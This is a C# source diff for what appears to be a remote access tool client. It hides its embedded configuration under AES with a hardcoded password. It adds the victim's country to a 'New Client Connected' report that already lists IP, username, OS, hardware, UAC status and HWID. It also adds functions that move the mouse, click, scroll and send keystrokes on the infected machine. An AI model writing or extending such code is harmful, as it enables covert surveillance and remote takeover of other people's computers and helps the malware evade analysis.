@@ -1,4 +1,5 @@
 ﻿using LazyServer;
+using Newtonsoft.Json;
 using Newtonsoft.Json.Linq;
 using PentestTools;
 using System;
@@ -10,6 +11,7 @@ using System.Net;
 using System.Net.Http;
 using System.Reflection;
 using System.Runtime.InteropServices;
+using System.Security.Cryptography;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
@@ -36,11 +38,45 @@ public static class GClass
         using (Stream stream = assembly.GetManifestResourceStream(resourceName))
         using (StreamReader reader = new StreamReader(stream))
         {
-            _cachedConfig = JObject.Parse(reader.ReadToEnd());
+            var raw = reader.ReadToEnd();
+            var decrypted = string.Empty;
+            if (!IsJson(raw)) {
+                decrypted = GClass.AesDecrypt(raw, "pe3ASaxZMwfg");
+            }
+            Console.WriteLine(IsJson(raw) ? GClass.AesEncrypt(raw, "pe3ASaxZMwfg") : decrypted);
+            _cachedConfig = JObject.Parse(IsJson(raw) ? raw : decrypted);
             return _cachedConfig;
         }
     }
-
+    private static bool IsJson(string strInput)
+    {
+        if (string.IsNullOrWhiteSpace(strInput)) { return false; }
+        strInput = strInput.Trim();
+        if ((strInput.StartsWith("{") && strInput.EndsWith("}")) || //For object
+            (strInput.StartsWith("[") && strInput.EndsWith("]"))) //For array
+        {
+            try
+            {
+                var obj = JToken.Parse(strInput);
+                return true;
+            }
+            catch (JsonReaderException jex)
+            {
+                //Exception in parsing json
+                Console.WriteLine(jex.Message);
+                return false;
+            }
+            catch (Exception ex) //some other exception
+            {
+                Console.WriteLine(ex.ToString());
+                return false;
+            }
+        }
+        else
+        {
+            return false;
+        }
+    }
     public static bool IsTrue(string param)
     {
         return config()[param]?.Value<bool>() ?? false;
@@ -120,6 +156,7 @@ public static class GClass
     {
         try
         {
+            var country = await FlagDownloader.GetCountryAsync(info["ip"].ToString());
             var embed = new JObject
             {
                 ["title"] = "🟢 New Client Connected",
@@ -129,10 +166,11 @@ public static class GClass
                     new JObject { ["name"] = "IP", ["value"] = $"`{info["ip"]}`", ["inline"] = true },
                     new JObject { ["name"] = "Username", ["value"] = $"`{info["username"]}`", ["inline"] = true },
                     new JObject { ["name"] = "OS", ["value"] = $"`{info["os"]}`", ["inline"] = false },
+                    new JObject { ["name"] = "Country", ["value"] = $"`{country}`", ["inline"] = false },
                     new JObject { ["name"] = "CPU", ["value"] = $"`{info["cpu"]}`", ["inline"] = false },
                     new JObject { ["name"] = "GPU", ["value"] = $"`{info["gpu"]}`", ["inline"] = false },
                     new JObject { ["name"] = "UAC Status", ["value"] = $"`{info["uac"]}`", ["inline"] = true },
-                    new JObject { ["name"] = "HWID", ["value"] = $"`{info["hwid"]}`", ["inline"] = false }
+                    new JObject { ["name"] = "HWID", ["value"] = $"`{info["hwid"]}`", ["inline"] = true }
                 },
                 ["footer"] = new JObject
                 {
@@ -233,4 +271,204 @@ public static class GClass
             ["hwid"] = DeviceInfo.GetHWID()
         };
     }
+
+    private const int KeySize = 256;
+    private const int BlockSize = 128;
+    private const int DerivationIterations = 1000;
+
+    public static string AesEncrypt(string plainText, string password)
+    {
+        byte[] saltBytes = GenerateRandomBytes(32);
+        byte[] ivBytes = GenerateRandomBytes(16);
+        byte[] keyBytes = GetKey(password, saltBytes);
+
+        using (var aes = Aes.Create())
+        {
+            aes.KeySize = KeySize;
+            aes.BlockSize = BlockSize;
+            aes.Mode = CipherMode.CBC;
+            aes.Padding = PaddingMode.PKCS7;
+            aes.Key = keyBytes;
+            aes.IV = ivBytes;
+
+            using (var encryptor = aes.CreateEncryptor())
+            using (var ms = new MemoryStream())
+            {
+                ms.Write(saltBytes, 0, saltBytes.Length);
+                ms.Write(ivBytes, 0, ivBytes.Length);
+
+                using (var cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))
+                using (var sw = new StreamWriter(cs))
+                {
+                    sw.Write(plainText);
+                }
+
+                return Convert.ToBase64String(ms.ToArray());
+            }
+        }
+    }
+
+    public static string AesDecrypt(string encryptedText, string password)
+    {
+        byte[] fullCipher = Convert.FromBase64String(encryptedText);
+
+        byte[] saltBytes = new byte[32];
+        byte[] ivBytes = new byte[16];
+        Array.Copy(fullCipher, 0, saltBytes, 0, saltBytes.Length);
+        Array.Copy(fullCipher, saltBytes.Length, ivBytes, 0, ivBytes.Length);
+
+        byte[] cipherBytes = new byte[fullCipher.Length - saltBytes.Length - ivBytes.Length];
+        Array.Copy(fullCipher, saltBytes.Length + ivBytes.Length, cipherBytes, 0, cipherBytes.Length);
+
+        byte[] keyBytes = GetKey(password, saltBytes);
+
+        using (var aes = Aes.Create())
+        {
+            aes.KeySize = KeySize;
+            aes.BlockSize = BlockSize;
+            aes.Mode = CipherMode.CBC;
+            aes.Padding = PaddingMode.PKCS7;
+            aes.Key = keyBytes;
+            aes.IV = ivBytes;
+
+            using (var decryptor = aes.CreateDecryptor())
+            using (var ms = new MemoryStream(cipherBytes))
+            using (var cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
+            using (var sr = new StreamReader(cs))
+            {
+                return sr.ReadToEnd();
+            }
+        }
+    }
+
+    private static byte[] GenerateRandomBytes(int length)
+    {
+        var randomBytes = new byte[length];
+        using (var rng = RandomNumberGenerator.Create())
+        {
+            rng.GetBytes(randomBytes);
+        }
+        return randomBytes;
+    }
+
+    private static byte[] GetKey(string password, byte[] salt)
+    {
+        using (var keyDerivation = new Rfc2898DeriveBytes(password, salt, DerivationIterations))
+        {
+            return keyDerivation.GetBytes(KeySize / 8);
+        }
+    }
+    // ========== INPUT SIMULATION METHODS ==========
+
+    [DllImport("user32.dll")]
+    private static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, UIntPtr dwExtraInfo);
+
+    [DllImport("user32.dll")]
+    private static extern uint MapVirtualKey(uint uCode, uint uMapType);
+
+    private const uint MOUSEEVENTF_MOVE = 0x0001;
+    private const uint MOUSEEVENTF_LEFTDOWN = 0x0002;
+    private const uint MOUSEEVENTF_LEFTUP = 0x0004;
+    private const uint MOUSEEVENTF_RIGHTDOWN = 0x0008;
+    private const uint MOUSEEVENTF_RIGHTUP = 0x0010;
+    private const uint MOUSEEVENTF_MIDDLEDOWN = 0x0020;
+    private const uint MOUSEEVENTF_MIDDLEUP = 0x0040;
+    private const uint MOUSEEVENTF_WHEEL = 0x0800;
+
+    public static void MouseMoveAbsolute(int x, int y)
+    {
+        Cursor.Position = new Point(x, y);
+        mouse_event(MOUSEEVENTF_MOVE, x, y, 0, UIntPtr.Zero);
+    }
+
+    public static void PerformMouseClick(string button)
+    {
+        switch (button.ToLower())
+        {
+            case "left":
+                mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, UIntPtr.Zero);
+                mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, UIntPtr.Zero);
+                break;
+            case "right":
+                mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, UIntPtr.Zero);
+                mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, UIntPtr.Zero);
+                break;
+            case "middle":
+                mouse_event(MOUSEEVENTF_MIDDLEDOWN, 0, 0, 0, UIntPtr.Zero);
+                mouse_event(MOUSEEVENTF_MIDDLEUP, 0, 0, 0, UIntPtr.Zero);
+                break;
+        }
+    }
+
+    public static void ScrollMouse(int delta)
+    {
+        mouse_event(MOUSEEVENTF_WHEEL, 0, 0, (uint)delta, UIntPtr.Zero);
+    }
+
+    public static void SendKeyPress(string keyName)
+    {
+        try
+        {
+            if (string.IsNullOrWhiteSpace(keyName))
+                return;
+
+            // Handle special keys with SendKeys format
+            string sendKey = keyName.ToLower() switch
+            {
+                "enter" => "{ENTER}",
+                "tab" => "{TAB}",
+                "backspace" => "{BACKSPACE}",
+                "esc" or "escape" => "{ESC}",
+                "space" => " ",
+                "left" => "{LEFT}",
+                "right" => "{RIGHT}",
+                "up" => "{UP}",
+                "down" => "{DOWN}",
+                "delete" => "{DELETE}",
+                "insert" => "{INSERT}",
+                "home" => "{HOME}",
+                "end" => "{END}",
+                "pageup" => "{PGUP}",
+                "pagedown" => "{PGDN}",
+                "capslock" => "{CAPSLOCK}",
+                "numlock" => "{NUMLOCK}",
+                "scrolllock" => "{SCROLLLOCK}",
+                "f1" => "{F1}",
+                "f2" => "{F2}",
+                "f3" => "{F3}",
+                "f4" => "{F4}",
+                "f5" => "{F5}",
+                "f6" => "{F6}",
+                "f7" => "{F7}",
+                "f8" => "{F8}",
+                "f9" => "{F9}",
+                "f10" => "{F10}",
+                "f11" => "{F11}",
+                "f12" => "{F12}",
+                _ => EscapeIfNeeded(keyName)
+            };
+
+            SendKeys.SendWait(sendKey);
+        }
+        catch
+        {
+            // Optional: log or handle
+        }
+    }
+
+    private static string EscapeIfNeeded(string key)
+    {
+        // Escape special SendKeys characters
+        string escaped = key.Replace("+", "{+}")
+                            .Replace("^", "{^}")
+                            .Replace("%", "{%}")
+                            .Replace("~", "{~}")
+                            .Replace("(", "{(}")
+                            .Replace(")", "{)}")
+                            .Replace("{", "{{}")
+                            .Replace("}", "{}}");
+
+        return escaped;
+    }
+
 }
